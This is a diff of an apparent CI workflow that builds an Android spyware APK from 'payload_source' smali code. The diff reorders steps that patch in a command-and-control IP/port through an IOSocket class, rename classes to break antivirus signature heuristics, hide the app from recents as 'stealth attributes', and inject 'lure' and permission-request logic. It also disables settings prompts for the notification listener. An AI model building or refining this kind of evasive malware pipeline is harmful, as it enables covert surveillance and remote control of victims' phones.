@@ -44,8 +44,13 @@ jobs:
             rm -rf "payload_source/smali/com/etechd"
           fi
 
-          # 2. Deep Class Renaming (Breaking Signature Heuristics)
-          # Format: [OldName] [NewName]
+          # 2. Update patch_payload.sh BEFORE class renaming
+          # This ensures the patching script knows where to look
+          chmod +x patch_payload.sh
+          sed -i "s|$OLD_PATH/IOSocket.smali|$NEW_PATH/IOSocket.smali|g" patch_payload.sh
+          ./patch_payload.sh
+
+          # 3. Deep Class Renaming (Scrambling Signature)
           CLASSES=(
             "MainActivity A"
             "MainService S"
@@ -71,24 +76,18 @@ jobs:
             read -r OLD_NAME NEW_NAME <<< "$item"
             echo "Renaming Class: $OLD_NAME -> $NEW_NAME"
             
-            # Rename references in all Smali files
             find payload_source -type f -name "*.smali" -exec sed -i "s|$NEW_PATH/$OLD_NAME|$NEW_PATH/$NEW_NAME|g" {} +
-            
-            # Rename class definition and references in XML
             find payload_source -type f -exec sed -i "s|$NEW_PKG.$OLD_NAME|$NEW_PKG.$NEW_NAME|g" {} +
             
-            # Rename the file itself
             if [ -f "payload_source/smali/$NEW_PATH/$OLD_NAME.smali" ]; then
               mv "payload_source/smali/$NEW_PATH/$OLD_NAME.smali" "payload_source/smali/$NEW_PATH/$NEW_NAME.smali"
             fi
           done
 
-          # 3. Fix AndroidManifest.xml (Stealth Attributes)
-          # Add excludeFromRecents and change component names
+          # 4. Fix AndroidManifest.xml (Stealth Attributes)
           sed -i "s/android:name=\"$NEW_PKG.A\"/android:name=\"$NEW_PKG.A\" android:excludeFromRecents=\"true\"/g" payload_source/AndroidManifest.xml
 
-          # 4. Inject Runtime Permissions & Lure logic into A.smali (formerly MainActivity)
-          # We use the templates created earlier but update the placeholders to 'A'
+          # 5. Inject Runtime Permissions & Lure logic into A.smali
           cp payload_source/permissions.smali.template permissions.smali
           sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" permissions.smali
           sed -i "s|MainActivity|A|g" permissions.smali
@@ -97,20 +96,13 @@ jobs:
           sed -i "s|NEW_PATH_PLACEHOLDER|$NEW_PATH|g" redirect.smali
           sed -i "s|MainActivity|A|g" redirect.smali
 
-          # Inject into A.smali
           sed -i "\|invoke-virtual {p0, v0}, L$NEW_PATH/A;->setContentView(I)V|r permissions.smali" "payload_source/smali/$NEW_PATH/A.smali"
           sed -i "\|invoke-virtual {p0, v0, v1}, L$NEW_PATH/A;->requestPermissions|r redirect.smali" "payload_source/smali/$NEW_PATH/A.smali"
 
-          # 5. Disable the "App Info" Loop that was bothering the user
-          # We comment out the code that opens the settings if the notification listener is not running
+          # 6. Disable the "App Info" Loop
           sed -i 's/const-string v7, "android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"/const-string v7, "unused"/g' "payload_source/smali/$NEW_PATH/A.smali"
           sed -i 's/const-string v8, "android.settings.APPLICATION_DETAILS_SETTINGS"/const-string v8, "unused"/g' "payload_source/smali/$NEW_PATH/A.smali"
           sed -i "s|invoke-virtual {p0}, L$NEW_PATH/A;->finish()V|# finish disabled|g" "payload_source/smali/$NEW_PATH/A.smali"
-
-          # 6. Dynamic IP/Port Patching (Update path to 'I.smali')
-          chmod +x patch_payload.sh
-          sed -i "s|payload_source/smali/$NEW_PATH/IOSocket.smali|payload_source/smali/$NEW_PATH/I.smali|g" patch_payload.sh
-          ./patch_payload.sh
 
       - name: Build APK
         run: |
